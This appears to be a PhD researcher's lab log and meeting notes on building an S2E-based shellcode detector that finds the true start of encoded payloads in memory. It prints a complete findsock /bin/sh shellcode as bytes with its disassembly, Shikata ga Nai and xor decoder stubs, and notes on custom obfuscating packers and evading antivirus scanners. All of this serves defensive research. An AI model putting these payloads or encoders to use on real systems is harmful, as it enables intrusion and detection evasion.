>>     12   2B @0xbfa08faa: eb b7             jmp 0xffffffffffffffb9  
>> Printing the memory map (1 snapshots)
>>    Printing snapshot 0
>>    The density (0 to 1) of this state's path is (28/28) = 1
>>    Mem_map start_addr: 0xbfa08f90, length: 68B, exec'ed bytes: 28, range: 28B, end_addr: 0xbfa08fab
           0 1 2 3  4 5 6 7  8 9 a b  c d e f   ASCII
0xbfa08f90 dad4b892 ba1e5cd9 7424f45b 29c9b10b  ......\.t$.[)...
0xbfa08fa0 83c30431 43140343 8658ebb7           ...1C..C.X..    
21 [State 0] Terminating state 0 with message 'eliminated a state that exec'ed out of module bounds'
All states were terminated

Make a simple packer? http://www.inf.fu-berlin.de/lehre/SS11/compsec/stack_builder.c



1) double check UPX
[s2e@s2e:~/s2e/dasos/ByteArrays]$ ./upx upx1-in.rawshell --best                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2011
UPX 3.08        Markus Oberhumer, Laszlo Molnar & John Reiser   Dec 12th 2011

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
upx: upx1-in.rawshell: EOFException: premature end of file

Packed 0 files.

[s2e@s2e:~/s2e/dasos/ByteArrays]$ ./upx upx1-in.rawshell --best --force-execve                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2011
UPX 3.08        Markus Oberhumer, Laszlo Molnar & John Reiser   Dec 12th 2011

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
upx: upx1-in.rawshell: UnknownExecutableFormatException

Packed 0 files.

According to this man page UPX does not support raw byute code: http://manpages.ubuntu.com/manpages/hardy/man1/upx-ucl.1.html
UPX is used to distort signatures of binaries that are transfered to remote systems, it does not interact on the exploit/shellcode level.

-Tried actual ghttpd.dump and it misses true start (claims an that true start is an OOB jmp). Note that it catches a subset of it true shellcode.s. 

-Investigated why ghttpd.dump isn't properly detected. Changed it to output traces whenever OOB happens. There is an illegal insn D9, doesn't know how to handle, what is the original ASM for the shellcode?

-find a simpler msfencode
-gdb execution of msfencoded dump (use make debug)

-reading list



------------------------------Meeting notes 6 Nov 2012
Get rid of "infinite loop detection," the coding is flawed as it would report any forloop that iterates more than 3 times as an "infinite" loop.
Instead do a inRangeInsnsCnt (the number of instructions that occur within the buffer boundaries from a time that it enters the range until it leaves, ie it set to 0 when it leaves boundary) and outOfRangeInsnsCnt (the number of instructions that occur out of buffer boundaries from the time it leaves until it returns, ie it is set to 0 when it reenters boundary).
We can then set a threshold of exec'ed OOB insns MAX_OUT_OF_RANGE, something large, say 1,000,000. Do not record value of bytes exec'ed during this, but record the addr/len. Perhaps try to print out symbol table to determine what is being called.

One trick to use with printing out where in memory it is, userspace is 0 .. TASK_SIZE, which is defined in include/asm/processor.h. The symb table is in /proc/PID/maps.

Add a condition that if the syscall number is 1 (exit) then it is a success


------------------------------Work since 6 Nov 2012
Ok where am I? need to get a packer go to show that the system works with polymorphism. What is the quickest way to do that?
Run through all the QA...
 1) ./shellcode-wrapper -p -x                          # test default
 2) ./shellcode-wrapper -i hw.rawshell -e 16 -x        # test inputting a rawshell (with eip)
 3) ./shellcode-wrapper -i hw.rawshell -x              # test inputting a rawshell (without eip/syscall)
 4) ./shellcode-wrapper -i hw.dump -f 496 -c 22 -x     # test inputting a dump (with eip/syscall)
 5) ./shellcode-wrapper -i hw2.dump -f 496 -c 40 -x    # test inputting a dump (without eip/syscall)
 6) ./shellcode-wrapper -i hw2.dump -x                 # test inputting a dump (without eip/syscall) and no offset/cases   <-----
 7) ./shellcode-wrapper -i hw4.dump -x                 # test inputting a dump (with eip/syscall) with rand fill
 8) ./shellcode-wrapper -i hw5.dump -x                 # test inputting a dump (without eip/syscall) with rand fill
 9) ./shellcode-wrapper -i ghttpd.dump -x -f 465 -c 20 # test actual dump input
10) ./shellcode-wrapper -n                          # test normalizing the default
11) ./shellcode-wrapper -i msfe-out-sganai.rawshell -n


Got stuck for a while ferretting out why preceding nulls were interpreted as different between runs. The core of the problem is that 0xc* addrs show up within code when no calls were made, 0 0 is add [eax], al or write reg a to the memory address of 0x<value of reg a>. This *might* be causing a segfault. Upon a new instruction it is used to look at the previous "valid" insn. If the current invalidates the previous, then the prev is scrubbed from use in future computation (the byte values in the snapshot are kept, but the s.min_addr is changed, NOTE that s.max_addr code is not complete but not needed right now; also the trace notes that insn as invalid. Thsi repeats for each new insn.

Thus for two things: isTraceSubset and printTrace/printSnapshot, the valid bool it also checked. For isTraceSubset only valid bytes are compared. And for printTrace invalid insns are noted. And for printSnapshot, the invalid bytes are not printed to screen.

I also caught an error where onTranslateInsnEnd the PID wasn't being checked, this eliminated a number of interruptions. Still need to figure out why there are other OOB jumps.


------------------------------Meeting notes 4 Dec 2012
Add a list of black listed, impossible, first insns, like '0 0'.
Investigate is the getPID reports the pid even if in kernel mode, and if so eliminate kernel mode.


------------------------------Work since 4 Dec 2012
 7) ./shellcode-wrapper -i hw4.dump -x                 # test inputting a dump (with eip/syscall) with rand fill <----
 8) ./shellcode-wrapper -i hw5.dump -x                 # test inputting a dump (without eip/syscall) with rand fill
 9) ./shellcode-wrapper -i ghttpd.dump -x -f 465 -c 20 # test actual dump input
10) ./shellcode-wrapper -n                             # test normalizing the default
11) ./shellcode-wrapper -i msfe-out-sganai.rawshell -n # test packer input

Look at debug.txt and see if pass trial #7
Do meeting note goals by Thursday. General goal is to eliminate the OOB if there aren't any jumps etc.

When running #7 execution dies on offset 70 (state 71). Pertinent log:
85 [State 71] Leaving buffer range @0xc126f4b4, 6 IoB insns; prev insn @0xbf8dc382
  1   2B @0xbf8dc382: 70 e1             jo 0xffffffffffffffe3  
Then it has 20,000+ Firing timer event, ie 6hrs of runtime before dieing of unknown causes
I reran things, within a minute it reaches 20,000+ OOB instructions, here are the final insns before it freezes
20778   2B @0xc1024e2b: 74 52             jz 0x54                 
20779  11B @0xc1024e2d: 64 c7  5 e4 d0 41 c1  1  0  0  0 mov dword [fs:0xc141d0e4], 0x1
20780   7B @0xc1024e38: 64 89 15 e0 d0 41 c1 mov [fs:0xc141d0e0], edx
20781   6B @0xc1024e3f: 8d 82 58  1  0  0 lea eax, [edx+0x158]    
20782   8B @0xc1024e45: 3e  f ab b2 58  1  0  0 bts [ds:edx+0x158], esi 
20783   3B @0xc1024e4d: 8b 42 24          mov eax, [edx+0x24]     
20784   5B @0xc1024e50:  5  0  0  0 40    add eax, 0x40000000     
20785   3B @0xc1024e55:  f 22 d8          mov cr3, eax   
That last insn clears the TLB. There were many other, what clearly appear to be, full functions (with proper stack frame restoration and rets).

I discovered that S2E's get PID fn (the one that I had been using) works by returning the top 20b of CR3. This explains why we were having out of bounds code appear.
Apparently, from what I've read, Linux kernel mode doesn't need to change CR3. Every process has the kernel mappings, so the kernel uses whatever value is in CR3 until it needs to be changed, if at all.
Looking into it further, I think I found a easy quick solution. Nearly all the OOB addresses that I've seen are >= 0xc1000000. As it turns out according to http://www.tldp.org/HOWTO/KernelAnalysis-HOWTO-7.html kernel space is mapped to 2 segments (code and data/stack) from [0xC000 0000] (3 GB) to [0xFFFF FFFF] (4 GB).
Assuming that (and I think that you agreed yesterday) we should ignore kernel code---as any state that would have it, would also make a syscall or sysenter, which we intercept already.
My proposal is that we ignore instructions with addresses >= 0xc0000000. Is this an acceptable assumption?

Re: rand fill hang on offset 70: best guess is that this is due to non proc code (possibly kernel) or signal handlers or hardware interrupts. 

I added code to count kernel insns, but there is a flaw in the logic or another non-kernel proc is running. 

Where to pick up: Unify the OOB insns exceptions. This took a whole day, the logic was very tricky and new features were added: knowledge of a tot_killable_insns, which if the program runs wnough of, then it kills the proc. This is a combination of other procs, the kernel, and oob instructions. I tried 1000000, but it took a few minutes to reach 30000, so I set it to 10000. Each of the subcategories can be reset, but total keeps counting until a legit insn runs. I could make this about 100,000, but we'll see. Also it may be worth taking other procs out of the count.


There appears to be an issue with labels used in jmps and loops. Perhaps the distances aren't being read properly by the 64b VMM?
Also how is the f4 hlt cmd handled? apparently it should cause a segfault if not in ring0


73 [State 19] Message from guest (0xbfd8057c): << About to call dasospreproc_init with shell: 0xbfd80f20 (offset of 480 not yet applied), shell_len: 1024, eip: 0xbfd81120

>> Recv'ed custom insn for a DasosPreproc memory segment within pid 86716416, addr range: 0xbfd80f20-0xbfd81320 with eip: 0xbfd81120 buffer length: 1024 and syscall number: 102
73 [State 19] @0x080495c3, left buffer range after 17 IoB insns; last IoB insn @0xbfd8111e, disasm in debug.
  1  2B @0xbfd8111e: cd 80             int 0x80    

How was an int 80 issued by the system call detector not turned on?

extended the signal handler

Excellent discussion on registers: http://www.eecg.toronto.edu/~amza/www.mindsec.com/files/x86regs.html also see http://www.cs.virginia.edu/~evans/cs216/guides/x86.html#registers

Where to pick up: look at debug.txt of ./shellcode-wrapper -i ghttpd.dump -x -f 462 -c 89 # test actual dump input from within nop sled to 1B after last syscall


Notes on some shellcode:
(from http://www.phrack.org/issues.html?id=7&issue=62)
Jmp/Call: To get EIP (to use as a relative base address), we can use a CALL and a POP instruction. Upon a call, the return value is pushed onto the stack. So, if the first thing we do in the function is a POP command, we can store the return value in a register. As shown below, EAX will be 451005.
450000:     
      label1:  pop eax
450005:     ... (eax = 451005)

451000:     call label1    ;start here!
451005:

Most likely you will find something similar to the code below in a 
shellcode, which does about the same thing.

450000:        jmp label1
450002:  
      label2:  jmp cont
450004:  
      label1:  call label2  
450009:  
      cont:       pop eax
            ...   (eax = 450009)

Another interesting mechanism being use to obtain the EIP is to make use of a few special FPU instructions.
   d9 ee          fldz             ; pushes 0.0 onto FPU stack
   ; FPU updates an element of the FpuSaveState struct named fpu_instruction_pointer to this insn address
   d9 74 24 f4    fnstenv [esp-12] ; stores FpuSaveState struct onto stack at [esp-0xc]
   ; this offset puts the fpu_instruction_pointer element at [esp]
   5b             pop ebx          ; loads ebx with the fpu_instruction_pointer value
   ; ebx now contains a value that points to the location of the fldz insn, can be used as a base register to access nearby with relative addresses

For a decently small code obfuscator check out: https://www.symantec.com/avcenter/reference/evolving.shell.code.pdf

                   
  3  1B @0xbf9c1c61: 90                    nop                     
                                                                             ; zero out ecx
  4  2B @0xbf9c1c62: 29 c9                 sub ecx, ecx                      ; ecx = value - value = 0   
                                                                             ; set the counter to 16
  5  3B @0xbf9c1c64: 83 e9 f0              sub ecx, 0xf0                     ; ecx = ecx - 0xf0 = 0 - -16 = 16 (signed 0b11110000 = -128 + 0b01110000 (112) = -16)
                                                                             ; do a FPU insn, prompt record keeping
  7  2B @0xbf9c1c67:*d9 ee                 fldz                              ; set FPU's record of EIP to this insn 0xbf9c1c67
                                                                             ; get the FPU's record
  8  4B @0xbf9c1c69: d9 74 24 f4           fnstenv [esp-0xc]                 ; write FPU's struct of records to [esp-0xc], which puts the fldz PC value at [esp]
                                                                             ; get the addr for relative addressing
  9  1B @0xbf9c1c6d: 5b                    pop ebx                           ; ebx = 0xbf9c1c67
                                       ; label LOOP:
                                                                             ; treat the 4B at ebx+0x13 as a pointer, eg int * a; a = (int *)(ebx+0x13);
                                                                             ; 0xbf9c1c67 + 0x13 = 0xbf9c1c7a
 10  7B @0xbf9c1c6e: 81 73 13 49 d4 d6 21  xor dword [ebx+0x13], 0x21d6d449  ; a[0] = a[0] ^ 0x49d4d621
                                                                             ; 0xbf9c1c67 - 0xfc = 0xbf9c1c6b (0xfc = 252; signed 0b11111100 = -128 + 0b01111100 (124) = -4)
 11  3B @0xbf9c1c75: 83 eb fc              sub ebx, 0xfc                     ; ebx = ebx - -4 = ebx + 4;   
                                                                             ; loop LOOP
                                                                             ; ecx = ecx - 1; 
                                                                             ; if (ecx != 0) jmp 0xf4 (0xf4 = unsigned 244 = signed 0b11110100 = -128 + 0b01110100 (116) = -12) and 0xbf9c1c78 + 2 (length of insn) - 12 = 0xbf9c1c6e;)  
 12  2B @0xbf9c1c78: e2 f4                 loop 0xf4                         ; else /* ecx == 0 */ continue to 0x...x7a
                                                                             ; 




Added exec-all.h:224 (S2EEditedSources/qemu-exec-all.h) within struct TranslationBlock: 
    uint64_t pcOfNextInstr; /* RJF, allows translate.c to report the next PC it plans to execute */
Added i386-translate.c:8174 (S2EEditedSources/i386-translate.c) within gen_intermediate_code_internal, the fn that calls disas_insn:
#ifdef CONFIG_S2E
        tb->pcOfNextInstr = pc_ptr; // RJF
#endif
That didn't work, instead did within i386-translate.c:gen_instr_end(DisasContext *s)
   s->tb->pcOfNextInstr = s->useNextPc ? s->nextPc : (uint64_t)-1; // RJF


this only gets sequential nextPCs, need to catch when jmps, etc modify things.



------------------------------14 Feb 2013
Summary of previous work gap in notes:
-Did huge code base revamp and QA on it.
-The primary error worth debugging is faulty handling of loops as seen in ghttpd dump.
-Did Comp Exam/Reading List Dec 3 pushed to Dec 24 pushed to Jan 3.
-Did PhD Diss Proposal Presentation Jan 28.

Directionary notes from proposal preparation:
-Dr. Chen wants Malware classification/genome
likelihood of code existing as relation to EIP



This log file got sporadic in a rush for development. I have created obfuscated shellcode and successfully ran it on our system.
Ideas compiled from a few places, such as:
http://www.safemode.org/files/zillion/shellcode/doc/Writing_shellcode.html
http://funoverip.net/2011/09/simple-shellcode-obfuscation/

We have two tools under the directory ObfuscationTesting:
1) junkcodeInsertion.pl which given a shellcode will insert junk bytes between every byte
2) xorencode.pl which given a shellcode and a key will encode the bytes

Both function the same way, a jmp to a call establishes the address to start decoding at as well as the place to call once decoded. The call returns back into the body of the decoder which contains a loop. The loop is stopped by a count or canary and when complete the shellcode executes as it normally would.

To look at the output use ndisasm -b 32 X.rawshell, or hexdump X.rawshell (but beware that the endianness is different). You can then look at it with shellcode-wrapper-concrete -i X.rawshell -p [-x]. Once it executes locally, you can make an entry in firstRan.sh for it and then do a make run. The results are in s2e-last/debug.txt, and save-worthy results are put into SavedOutputs/descriptor.txt.


The loop jmp detector is flawed, fix that and get the ghttpd sample running.



------------------------------Meeting notes 14 Feb 2013
I was able to run xor(xor()) an xor(junk()).

I looked further at ghttpd. It is an xor decoder loop, so I make a xordecoder given an offset and the result is a text book findsock shellcode.

[s2e@s2e:~/s2e/dasos/ObfuscationTesting]$ ndisasm -u findsock-deobs.rawshell
00000000  31D2              xor edx,edx
00000002  52                push edx
00000003  89E5              mov ebp,esp
00000005  6A07              push byte +0x7
00000007  5B                pop ebx
00000008  6A10              push byte +0x10
0000000A  54                push esp
0000000B  55                push ebp
0000000C  52                push edx
0000000D  89E1              mov ecx,esp
0000000F  FF01              inc dword [ecx]
00000011  6A66              push byte +0x66
00000013  58                pop eax
00000014  CD80              int 0x80
00000016  66817D028FFF      cmp word [ebp+0x2],0xff8f
0000001C  75F1              jnz 0xf
0000001E  5B                pop ebx
0000001F  6A02              push byte +0x2
00000021  59                pop ecx
00000022  B03F              mov al,0x3f
00000024  CD80              int 0x80
00000026  49                dec ecx
00000027  79F9              jns 0x22
00000029  52                push edx
0000002A  682F2F7368        push dword 0x68732f2f
0000002F  682F62696E        push dword 0x6e69622f
00000034  89E3              mov ebx,esp
00000036  52                push edx
00000037  53                push ebx
00000038  89E1              mov ecx,esp
0000003A  B00B              mov al,0xb
0000003C  CD80              int 0x80
0000003E  0000              add [eax],al

Why weren't these bytes in the memory capture?!

"\x31\xd2\x52\x89\xe5\x6a\x07\x5b\x6a\x10\x54\x55\x52\x89\xe1"
"\xff\x01\x6a\x66\x58\xcd\x80\x66\x81\x7d\x02\x8f\xff\x75\xf1"
"\x5b\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x52\x68\x2f\x2f"
"\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b"
"\xcd\x80\x00\x00";

They are:
0xbfffb4a0 90909090 90909090 90909090 90909090 ................
0xbfffb4b0 90909090 90909090 90909090 90909090 ................
0xbfffb4c0 90909090 90909090 90909090 90909090 ................
0xbfffb4d0 90909090 90909090 90909090 90909090 ................
0xbfffb4e0 90909090 29c983e9 f0d9eed9 7424f45b ....).......t$.[
0xbfffb4f0 81731349 d4d62183 ebfce2f4 31d25289 .s.I..!.....1.R.
0xbfffb500 e56a075b 6a105455 5289e1ff 016a6658 .j.[j.TUR....jfX
0xbfffb510 cd806681 7d028fff 75f15b6a 0259b03f ..f.}...u.[j.Y.?
0xbfffb520 cd804979 f952682f 2f736868 2f62696e ..Iy.Rh//shh/bin
0xbfffb530 89e35253 89e1b00b cd800000 90909090 ..RS............

Note that 4fc matches the de-obfuscated shellcode. If we execute earlier than 4fc, then the code gets re-xored (ie re-encoded). 4fc - 310 = 1ec = 492. Actually make that 490 bc I missed the two bytes... 

It is a success:
>>    Printing success 1
>> Success from offset 490
>> Success densities, overlay: 1; avg: 1
>> Success eip: 0xbfd103e0 offset from base: 512
>> Printing PC Trace (instructions in order of execution)
>>      1  2B @0xbfd103ca: 31 d2                              xor edx, edx             nextPC: 0xbfd103cc
>>      2  1B @0xbfd103cc: 52                                 push edx                 nextPC: 0xbfd103cd
>>      3  2B @0xbfd103cd: 89 e5                              mov ebp, esp             nextPC: 0xbfd103cf
>>      4  2B @0xbfd103cf: 6a 07                              push 0x7                 nextPC: 0xbfd103d1
>>      5  1B @0xbfd103d1: 5b                                 pop ebx                  nextPC: 0xbfd103d2
>>      6  2B @0xbfd103d2: 6a 10                              push 0x10                nextPC: 0xbfd103d4
>>      7  1B @0xbfd103d4: 54                                 push esp                 nextPC: 0xbfd103d5
>>      8  1B @0xbfd103d5: 55                                 push ebp                 nextPC: 0xbfd103d6
>>      9  1B @0xbfd103d6: 52                                 push edx                 nextPC: 0xbfd103d7
>>     10  2B @0xbfd103d7: 89 e1                              mov ecx, esp             nextPC: 0xbfd103d9
>>     11  2B @0xbfd103d9: ff 01                              inc dword [ecx]          nextPC: 0xbfd103db
>>     12  2B @0xbfd103db: 6a 66                              push 0x66                nextPC: 0xbfd103dd
>>     13  1B @0xbfd103dd: 58                                 pop eax                  nextPC: 0xbfd103de
>>     14  2B @0xbfd103de: cd 80                              int 0x80                 nextPC: 0xbfd103e0
>> Printing the memory map (1 snapshots)
>>    Printing snapshot 0
>>    The density (0 to 1) of this state's path is (22/22) = 1
>>    Mem_map start_addr: 0xbfd103ca, length: 1024B, valid bytes: 22, exec'ed bytes: 22, range: 22B, end_addr: 0xbfd103df
           0 1 2 3  4 5 6 7  8 9 a b  c d e f   ASCII
0xbfd103c0                       31d2 5289e56a            1.R..j
0xbfd103d0 075b6a10 54555289 e1ff016a 6658cd80  .[j.TUR....jfX..

>>    Done printing success 1
>> Done printing successes
>> The success/offset with the highest overlay density is 1, value of 1
>> The success/offset with the highest average density is 1, value of 1
>> There were 1 different eips: 0xbfd103e0 

Now I need to think about what this means for detecting the true offset when the code has already been decoded and the decoder would reobfuscate...


------------------------------Meeting notes 20 Feb 2013
Once we resolve SGaNai, then we can close the finding the start of code problem.
We should also try a truly self-modifying scode.
Perhaps also one that has a key in mem to demonstrate live capture.
There is a small bug when storing loops in the trace, they print out twice instead of either once or per loop.
Need to implement copy on write link list { addr, len, orig value array, insn addr that wrote, insn seq num that wrote }
When a byte that has been written is exec'ed then make a new snapshot
Dump this data to file so we can parse it to make a replay capability.

------------------------------Work since 20 Feb 2013
The Shikata ga Nai encoder[9], included with the Metasploit Framework, implements polymorphic XOR additive feedback encoding against a four byte key.

[s2e@s2e:~/s2e/dasos/ByteArrays]$ ndisasm -u msfe-out-sganai.rawshell
00000000  DAD4              fcmovbe st4          ; make a fpu insn
00000002  B892BA1E5C        mov eax,0x5c1eba92   ; eax = 92ba1e5c (initial key)
00000007  D97424F4          fnstenv [esp-0xc]    ; write fpu records to put 00000000 at esp
0000000B  5B                pop ebx              ; ebx = 00000000
0000000C  29C9              sub ecx,ecx          ; clear ecx
0000000E  B10B              mov cl,0xb           ; ecx = 11
                        ; loop decode 11 times
00000010  83C304            add ebx,byte +0x4    ; ebx = 00000004
00000013  314314            xor [ebx+0x14],eax   ; [0x00000018] = [0x00000018] ^ eax
00000016  034314            add eax,[ebx+0x14]   ; eax = eax + [0x00000018] 
00000019  e2f5              loop ->0x10          ; ecx = 10
0000001b  eb

//https://onlinedisassembler.com/odaweb/run_hex
keyN = 0x92ba1e5c;
decode_loc = 0x14;
for (i = 0; i < 11; i++) {
   decode_loc += 4;
   word_encoded = makeWordFromByteArray (decode_loc); // starting at byte_array[decode_loc], grab 4B, return as an uint32_t
   word_decoded = word_encoded ^ keyN;
   storeWordIntoByteArray (decode_loc, word_decoded); // starting at byte_array[decode_loc], write the 4B given in word_decoded
   keyN = keyN + word_decoded;
}
// referencing a 8b array by the nth 8b as a 32b word = ((uint32_t*) &(byte_array[decode_loc]) )[0];

00000010  83C304            add ebx,byte +0x4    ; ebx = 00000008
00000013  314314            xor [ebx+0x14],eax   ; [0x0000001c] = [0x0000001c] ^ eax
00000016  034314            add eax,[ebx+0x14]   ; eax = eax + [0x0000001c]
00000019  e2f5              loop ->0x10          ; ecx = 9
0000001b  eb

// first disasm difference
00000016  034386            add eax,[ebx-0x7a]   ; 
00000019  58                pop eax
0000001A  EBB7              jmp short 0xffffffd3
0000001C  B5C5              mov ch,0xc5
0000001E  258809F174        and eax,0x74f10988
00000023  D32A              shr dword [edx],cl
00000025  CB                retf
00000026  A4                movsb
00000027  51                push ecx
00000028  A3E6C926BA        mov [0xba26c9e6],eax
0000002D  B304              mov bl,0x4
0000002F  C6                db 0xc6
00000030  54                push esp
00000031  AB                stosd
00000032  68385B64F2        push dword 0xf2645b38
00000037  AB                stosd
00000038  CF                iretd
00000039  1AD0              sbb dl,al
0000003B  13788A            adc edi,[eax-0x76]
0000003E  5A                pop edx
0000003F  38E2              cmp dl,ah
00000041  7591              jnz 0xffffffd4
00000043  CD                db 0xcd

[s2e@s2e:~/s2e/dasos/ByteArrays]$ ./PrintShell.sh msfe-out-sganai.rawshell -d 0,200 -x
!! Warning: disasm range is out of shellcode range, setting to maximum: 68
<< Requesting disasm out
<< From raw input

                                                                             ; do a FPU insn, prompt record keeping
  7  2B @0xbf9c1c67:*d9 ee                 fldz                              ; set FPU's record of EIP to this insn 0xbf9c1c67
                                                                             ; get the FPU's record
  8  4B @0xbf9c1c69: d9 74 24 f4           fnstenv [esp-0xc]                 ; write FPU's struct of records to [esp-0xc], which puts the fldz PC value at [esp]
                                                                             ; get the addr for relative addressing
  9  1B @0xbf9c1c6d: 5b                    pop ebx                           ; ebx = 0xbf9c1c67
                                       ; label LOOP:

dad4             fcmovbe st0, st4        ; make a fpu insn
b892ba1e5c       mov eax, 0x5c1eba92     ; x = 0x5c1eba92
d97424f4         fnstenv [esp-0xc]       ; write fpu records to put 
5b               pop ebx                 
29c9             sub ecx, ecx            
b10b             mov cl, 0xb             
83c304           add ebx, 0x4            
314314           xor [ebx+0x14], eax     
034386           add eax, [ebx-0x7a]     
58               pop eax                 
ebb7             jmp 0xffffffffffffffd3  ; jmp short 0xffffffd3
b5c5             mov ch, 0xc5            
258809f174       and eax, 0x74f10988     
d32a             shr dword [edx], cl     
cb               retf                    
a4               movsb                   
51               push ecx                
a3e6c926ba       mov [0xba26c9e6], eax   
b304             mov bl, 0x4             
c654             invalid                 ; C6 db 0xc6; 54 push esp;
ab               stosd                   
68385b64f2       push dword 0xf2645b38   
ab               stosd                   
cf               iretd                   
1ad0             sbb dl, al              
13788a           adc edi, [eax-0x76]     
5a               pop edx                 
38e2             cmp dl, ah              
7591             jnz 0xffffffffffffffd4  
cd               invalid                 ;  CD db 0xcd



--Start From Wang:-------------------
To get the intermediate, partially decoded result, we need to record the changes in memory. Previously proposed snapshot only happens when we see such self-modifying code that executes some instruction from the some address from where we have already executed a different instruction.

The XOR, junk code encoding (including the one used in ghttpd exploit) has separate memory range for decoder and the encoded/decode code. Therefore, the decoding does not trigger the snapshot we previously designed.

To handle such (simpler) self-modifying code, we can record the following info for each memory update within the buffer range at run-time:
1) the address and the size of the memory to be updated;
2) the current (to be updated) value of the memory;
3) the seq# and address of the instruction that will update the memory

Since memory updates within the same round of decoding tend to be clustered (both in time and space) to each other,  we can cluster the updated memory bytes into groups according to the following heuristics at offline:

cluster the memory updates instructions into rounds based on the seq#. We need to find a distance threshold, say 5 or 10 that will separate those instructions into clusters.

for each cluster of instructions, which correspondins to one rounds of decoding, we combine adjacent memory bytes into memory ranges.

for each round of decoding, we combine the memory ranges with those that have not changed. This will give us the complete snapshot of that round of decoding. We output this and point out which part has changed from what to what.
--End From Wang:-------------------

25 Feb: made DasosPreproc-10.cpp/h

Plan is to make a new mem_map for datas

Made a trace, unified insn_instance and data_instance as a typedef from event_instance. Used mem_map as is for data_map.

Found a CoreEvent onDataAccess that reports memory range, isWrite, isIO, writer's address, etc. 

Debug why there isn't an initialized data_map. PrintSuccess is stating that there isn't 1 to add the diffs to.




------------------------------Meeting notes 27 Feb 2013
Notation for below:
shellcode, s
junkcodeInsertion packer, junk(s)
xor packer, xor(s,key)
ranged xor packer, xor(s,key,offset,len)
shikata-ga-nai is written in my notes as sganai.

To review/verify our phone conversation here is the task list I compiled:
Add clustering (new snapshots made) by seqnums (get seqnum refined/debugged)
Redo a sanity check of sganai on S2E without instrumentation (disable my jump target asserts)
Demonstrate clustering, run system on output of xor(xor(xor(junk(s),key1,10,10),key1,30,10),key2,5,10)

A note on realistic examples for our future paper:
If we can't get sganai resolved, then we can demonstrate effectiveness with a packer that uses: self mutating key (eg every loop the key value goes up by 1); and, the encoding function overlaps (eg first xor does bytes 0-3 second does bytes 1-4 third 2-5, etc, instead of 1st 0-3, 2nd 4-7, 3rd 8-11, etc).
Most detection mechanisms search for the unpacking code. It is the weakest link and marginalizes the effectiveness of nested packing, e.g xor(xor(xor(junk(s)))) which outputs [de-xor1][xor1( [de-xor2][xor2( [de-xor3][xor3( [de-junk][junk(s)] )] )] )]  because all you need to detect is de-xor1. 
The state of the art from what I have seen is using code transformation (substitution, rearrangement  etc, like sganai), to avoid signature detection on the unpacker (eg de-xor1), plus at least one sandbox detection abort routine. The accepted litmus test is showing that whatever you use is undetectable by virustotal (an online malware scanner that compares 42 different antivirus programs on a given input). 


My understanding of seqnums: cluster happens between writes that are within 5 (or 10) insns/seqnums of eachother. eg #3,5,7 are on one snapshot and 13,15,17 in another, regardless if 13,15,17 don't overwrite what 3,5,7 wrote. Seqnum is globally monotonically increasing (ie dynamic) (addr x can have multiple seqnums, eg 13,15,17).

If necessary manually follow sganai try to determine if it truly is modifying intrablock insns.

Once we start to demonstrate on nesting packers a more efficient/realistic design, may be multiple range xor packer, xor(s,key1,offset1,len1,key2,offset2,len2,...); note that this differs from nesting ranged xor packers, which would output a byte array roughly in the form of [de-xor(key1,offset1,len1][xor([de-xor(key2,offset2,len2][xor([de-xor(key3,offset3,len3][xor(s,key3,offset3,len3)],key2,offset2,len2)],key1,offset1,len1)], and instead would output [de-xor(key1,offset1,len1,key2,offset2,len2,key3,offset3,len3)][xor(s,key1,offset1,len1,key2,offset2,len2,key3,offset3,len3)]. In otherwords only 1 unpacker instead of three nested unpackers.

------------------------
Todo:
-Devel clustering (new snapshots made) when seqnums between writes > 5 (or 10 insns). eg #3,5,7 are on one snapshot and 13,15,17 in another, regardless if 13,15,17 don't overwrite what 3,5,7 wrote. Seqnum is globally monotonically increasing (ie dynamic) (addr x can have multiple seqnums, eg 13,15,17)
-Get seqnum refined/debugged (why isn't it increasing properly, am I missing an onExecuteInstruction hook, vs the onTranslateInsnEnd hook currently used?)
-Redo a sanity check of S2E without instrumentation, showing that it can run sganai shellcode! (Disable my jump target asserts)
-Manually follow sganai try to determine if it is modifying intrablock insns.
-Design tests with shellcode, s, that is packed by a combination of junkcodeInsertion, junk(s), and xor, xor(keyN,s), or a ranged xor, xor(keyN,offset,len,s): test one (ie nested unpackers), xor(key2,5,10,xor(key1,30,10,xor(key1,10,10,junk(s)))); and if time, a test two (ie minimized/unnested unpackers), make a new xor that handles multiple ranges, xor(s,key1,offset1,len1,key2,offset2,len2,...): xor(key1,junk(s),key1,10,10,key2,30,10,key3,5,10))

Staying on top of documentation:
-To review, I have saved outputs of succesful runs for: xor(key1,s); junk(s); xor(key1,xor(key1,s)); xor(key1,junk(s)). For posterity I should add xor(key2,xor(key1,s)).
-Make a small write up on how exactly S2E works (intermediate rep, TCG, qemu, etc).
-Give short alrgorithmic overview of data trace method.

Notes:
-Goal to submit a paper in 2 months, which means finish devel (be able to monitor sganai) within 1 month.
-I may only get alerts of writes at the end of a block bc of performance considerations. But bc the signal also includes the value that was written, this doesn't matter (I will be able to track all writes, incl writes of diff value to same addr/size within same block.)


------------------------------Work since 27 Feb 2013
For sanity check of seeing if sganai runs without killing on bad jump detection I disabled the terminateStateEarly and cleaned up the bool settings to allow the state to continue. When disabled the execution still dies (seg fault, but after going into lib code 0x80...) so I re-enabled the jump assert.

Todo: 
1) Create ranged xor, xor(keyN,offset,len,s) and generate scode = xor(key2,5,10,xor(key1,30,10,xor(key1,10,10,junk(s))))
2) Get seqnum refined/debugged (why isn't it increasing properly, am I missing an onExecuteInstruction hook, vs the onTranslateInsnEnd hook currently used?)
3) Devel clustering (new snapshots made) when seqnums between writes > 5 (or 10 insns). eg #3,5,7 are on one snapshot and 13,15,17 in another, regardless if 13,15,17 don't overwrite what 3,5,7 wrote. Seqnum is globally monotonically increasing (ie dynamic) (addr x can have multiple seqnums, eg 13,15,17)
4) Manually follow sganai try to determine if it is modifying intrablock insns.



         s2e->getCorePlugin()->onTranslateInstructionEnd_RJF.emit(signal, state, tb, pc, nextpc); //RJF

/home/s2e/s2e/dasos/s2e/./s2e/qemu/cpu-exec.c:174:static TranslationBlock *tb_find_slow(target_ulong pc,
/home/s2e/s2e/dasos/s2e/./s2e/qemu/cpu-exec.c:223:static inline TranslationBlock *tb_find_fast(void)

http://comments.gmane.org/gmane.comp.emulators.qemu/67207
Insert op codes between translated instructions to count and check for writes
